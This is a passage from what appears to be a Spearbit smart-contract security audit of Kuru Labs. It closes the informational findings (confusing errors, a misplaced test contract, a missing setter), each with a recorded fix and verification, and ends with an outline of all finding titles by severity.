Two checks are being done: the first ensures that sufficient native asset has been sent while the second ensures that excess has not been sent. If either check fails, the same error is thrown: NativeAssetInsufficient\(\). This could be very confusing in the case that the second condition was the one that actually failed. A very similar issue can be found in analogous logic in OrderBook.placeAndExecuteMarketSell\(\):

49

if \(\_type == OrderBookType.NATIVE\_IN\_BASE && \!\_isMargin && \(msg.sender \!= address\(0\)\)\) \{

require\(

msg.value >= \_sizePrecisionToBaseAssetPrecision\(\_size\)

&& msg.value < \_sizePrecisionToBaseAssetPrecision\(\_size \+ 1\), 

OrderBookErrors.NativeAssetInsufficient\(\)

\); 

**Recommendation: **Emit distinct errors for the two different checks in both market order functions. 

**Kuru Labs: **Fixed in commit 8bc70487. 

**Spearbit: **Fix verified. 

**5.6.25**

**Move **MintableERC20.sol **To Test Directory**

**Severity: **Informational

**Context: **MintableERC20.sol\#L6

**Description: **The file libraries/MintableERC20.sol contains a contract that appears to be used only for testing \(an ERC20 with a permissionless mint\(\) function\). 

**Recommendation: **Move this file to the test/ directory to avoid confusion. 

**Kuru Labs: **Fixed in commit 46eff94e. 

**Spearbit: **Fix verified. 

**5.6.26**

**Have mutator for **allowedInterface **mapping**

**Severity: **Informational

**Context: **KuruForwarder.sol\#L89-L91

**Description: **allowedInterface is "immutable" as it's only set in the constructor; there could be a use-case for needing to mutate this list of allowed interfaces. 

**Recommendation: **Consider adding an onlyOwner function to add / remove selectors into this mapping. 

**Kuru Labs: **Fixed in commit 5f119810. 

**Spearbit: **Fix verified. 

DRAFT

50



# Document Outline

+ About Spearbit 
+ Introduction 
+ Risk classification  
	+ Impact 
	+ Likelihood 
	+ Action required for severity levels 

+ Executive Summary 
+ Findings  
	+ Critical Risk  
		+ Execution sequence of Router.deployProxy function can be exploited to drain MarginAccount completely 

	+ High Risk  
		+ Vault not credited maker rebates due to missing assignment 
		+ Withdraw amounts aren't modified when expected to be 

	+ Medium Risk  
		+ Markets Can Be Created With Inconsistent Type and Tokens 
		+ Inability of upgradeMultipleOrderBookProxies and upgradeMultipleVaultProxies functions to pass data and value 
		+ KuruForwarder: Missing deadlines for signatures 
		+ Accumulated rounding loss on fragmented flip order fills 
		+ KuruForwarder: Out of order execution of user requests 
		+ Large vault withdrawals may fail due to settlement amount adjustments 
		+ Vault operations can be performed when OrderBook is paused 
		+ Unchecked Casts Pose Significant Risk 

	+ Low Risk  
		+ Incoming flip order prices should not be equal best available prices 
		+ batchClaimMaxTokens\(\) will not work for native tokens 
		+ No boundaries for minSize could lead to DOS or market misconfiguration 
		+ A large maxSize could suffer DoS if it iterates through enough minSize orders 
		+ Market Creation Frontrunning 
		+ MarginAccountRequest can be disguised as ForwardRequest 
		+ Missing validation checks 
		+ approve\(\) used instead of safeApprove\(\) 
		+ Missing storage gap in AbstractAMM 
		+ Missing overriding \_domainNameAndVersionMayChange function in KuruForwarder 
		+ KuruForwarder: Missing sufficient msg.value check in execution functions 
		+ KuruForwarder: Missing restrictions on marginAccount and market addresses 
		+ MarginAccount: Missing ability to change feeCollector address 
		+ Breaking checks-effects-interactions pattern 
		+ Router: Missing inclusion of \_kuruAmmSpread for market salt creation 
		+ KuruAMMVault.deposit: native tokens are refunded to incorrect address 
		+ KuruAMMVault: Incorrect withdraw function implementation 
		+ IERC20.decimals\(\) Function Not Marked view and Returns Non-standard Type 
		+ Missing Setter Functions 
		+ No Reentrancy Protection Despite Extensive Native Token Use 
		+ Vault Can Leak Value to Arbitrage Due to Deposit Rebalancing 
		+ Delete Orders From Storage Upon Cancellation 

	+ Gas Optimization  
		+ Redundancies 
		+ Static estimations should have their own separate function 
		+ Inefficient implementation of \_depositToMarginAccount\(\) 
		+ Unnecessary repeated calculation of vault order best prices 
		+ Cache storage variables and repeated calculations in memory 
		+ Vacuous and Unused Function Return Values 
		+ Changing return prices for empty vault and orderbook simplifies some checks 
		+ No need to inherit Ownable for OrderBook and KuruAMMVault contracts 
		+ KuruForwarder: ECDSA.recoverCalldata can be used instead of ECDSA.recover 
		+ Returned value of \_msgSender\(\) function can be cached to save gas 
		+ Store Precisions Instead of Decimals for Base and Quote Assets 

	+ Informational  
		+ Better Function / Variable / Contract / File Naming 
		+ Improve creditUsersEncoded\(\) readability 
		+ Missing documentation on critical storage altering function 
		+ ERC777 reentrancy could drain isolated market 
		+ Typography mistakes 
		+ Expand documentation to include nuanced behavior expectations 
		+ Refactoring Recommendations for Readability 
		+ Obsolete / Incorrect Comments 
		+ Function Visibility 
		+ Import Organization 
		+ Unused Imports and Code 
		+ Contract Field Visibility 
		+ Compiler Settings 
		+ Missing revert reason 
		+ KuruForwarder: boolean returned by execution functions can be omitted 
		+ SafeTransferLib.safeTransferETH can be used to send native tokens 
		+ Missing event emission 
		+ Enforce a message length check when called via trusted forwarder 
		+ KuruERC20: Use Solady's ERC20 instead of OpenZeppelin's ERC20 to support permit function 
		+ MarginAccount.creditUsersEncoded should validate the length of \_encodedData input 
		+ The \_msgSender function can be implemented in ERC2771Context contract 
		+ Use Libraries for ERC20 Interfaces 
		+ Incomplete and Inconsistent Natspec 
		+ Potentially Confusing Errors In Market Order Functions 
		+ Move MintableERC20.sol To Test Directory 
		+ Have mutator for allowedInterface mapping



